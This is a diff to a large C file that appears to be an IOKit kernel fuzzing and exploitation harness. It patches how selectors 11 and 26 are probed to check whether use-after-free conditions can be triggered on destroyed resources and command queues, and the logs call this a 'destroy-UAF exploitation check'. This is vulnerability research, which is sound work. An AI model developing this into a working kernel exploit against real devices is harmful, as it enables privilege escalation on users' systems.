@@ -18978,8 +18978,11 @@ static kern_return_t duf_kill1(dufx *x, uint32_t sel, uint64_t id, const char *t
 static int duf_res_alive(dufx *x, uint32_t rid) {
     if (!rid) return 0;
     uint64_t a[2] = { rid, 0 };
-    kern_return_t kr = IOConnectCallScalarMethod(x->c, 11, a, 2, NULL, NULL);
-    LOG("[duf]   probe rid %u (sel11): kr 0x%08x %s", rid, (unsigned)kr, kr ? "DEAD?" : "alive");
+    uint64_t os = 0;   // sel11 s_set_resource_purgeable: sin 2, sout 1 —
+    uint32_t oc = 1;   // без out-буфера ядро отвечает BadArgument (v140 fix)
+    kern_return_t kr = IOConnectCallScalarMethod(x->c, 11, a, 2, &os, &oc);
+    LOG("[duf]   probe rid %u (sel11): kr 0x%08x out 0x%llx %s", rid, (unsigned)kr,
+        (unsigned long long)os, kr ? "DEAD?" : "alive");
     return kr == 0;
 }
 static int duf_queue_alive(dufx *x, uint64_t qid) {
@@ -18987,8 +18990,11 @@ static int duf_queue_alive(dufx *x, uint64_t qid) {
     uint8_t z[12];
     memset(z, 0, sizeof z);
     uint64_t a[1] = { qid };
-    kern_return_t kr = IOConnectCallMethod(x->c, 26, a, 1, z, sizeof z, NULL, NULL, NULL, NULL);
-    LOG("[duf]   probe qid %llu (sel26): kr 0x%08x %s", qid, (unsigned)kr, kr ? "DEAD?" : "alive");
+    uint64_t os = 0;   // sel26 s_set_priority_and_background: sin 1, strIn 12,
+    uint32_t oc = 1;   // sout 1 — out обязателен (v140 fix)
+    kern_return_t kr = IOConnectCallMethod(x->c, 26, a, 1, z, sizeof z, &os, &oc, NULL, NULL);
+    LOG("[duf]   probe qid %llu (sel26): kr 0x%08x out 0x%llx %s", qid, (unsigned)kr,
+        (unsigned long long)os, kr ? "DEAD?" : "alive");
     return kr == 0;
 }
 static int duf_nq_alive(dufx *x, uint64_t nqid) {
@@ -19049,8 +19055,11 @@ static void duf_use_dead(dufx *x, const dufcls *k, uint64_t id) {
             (unsigned long long)id);
         fsync(fileno(stderr));
         uint64_t a[2] = { id, 0 };
-        kern_return_t kr = IOConnectCallScalarMethod(x->c, 11, a, 2, NULL, NULL);
-        LOG("[duf]   -> kr 0x%08x (we survived)", (unsigned)kr);
+        uint64_t os = 0;
+        uint32_t oc = 1;
+        kern_return_t kr = IOConnectCallScalarMethod(x->c, 11, a, 2, &os, &oc);
+        LOG("[duf]   -> kr 0x%08x out 0x%llx (we survived)", (unsigned)kr,
+            (unsigned long long)os);
     } else if (k->dsel == 7) {
         LOG("[duf] case #%ld d-use: touch DEAD queue 0x%llx (sel26 + sel24, UAF deref?)", n,
             (unsigned long long)id);
@@ -19058,7 +19067,9 @@ static void duf_use_dead(dufx *x, const dufcls *k, uint64_t id) {
         uint8_t z[12];
         memset(z, 0, sizeof z);
         uint64_t a[1] = { id };
-        kern_return_t k1 = IOConnectCallMethod(x->c, 26, a, 1, z, sizeof z, NULL, NULL, NULL, NULL);
+        uint64_t os = 0;
+        uint32_t oc = 1;
+        kern_return_t k1 = IOConnectCallMethod(x->c, 26, a, 1, z, sizeof z, &os, &oc, NULL, NULL);
         uint64_t b[2] = { id, x->nqM };
         kern_return_t k2 = IOConnectCallScalarMethod(x->c, 24, b, 2, NULL, NULL);
         LOG("[duf]   -> sel26 0x%08x sel24 0x%08x (we survived)", (unsigned)k1, (unsigned)k2);
@@ -19154,7 +19165,7 @@ static void duf_run_class(dufx *x, const dufcls *k) {
 static void p_destroyuaf(void) {
     duf_skip = atol(getenv("FUZZ_DESTROYUAF_SKIP") ?: "0");
     duf_cn = 0;
-    LOG("[duf] v139 destroy-UAF exploitation check: skip %ld", duf_skip);
+    LOG("[duf] v140 destroy-UAF exploitation check (probes fixed: sel11/sel26 sout): skip %ld", duf_skip);
     static const struct { uint32_t dsel; const char *nm; } cl[4] = {
         { 9,  "resource" },
         { 7,  "command_queue" },
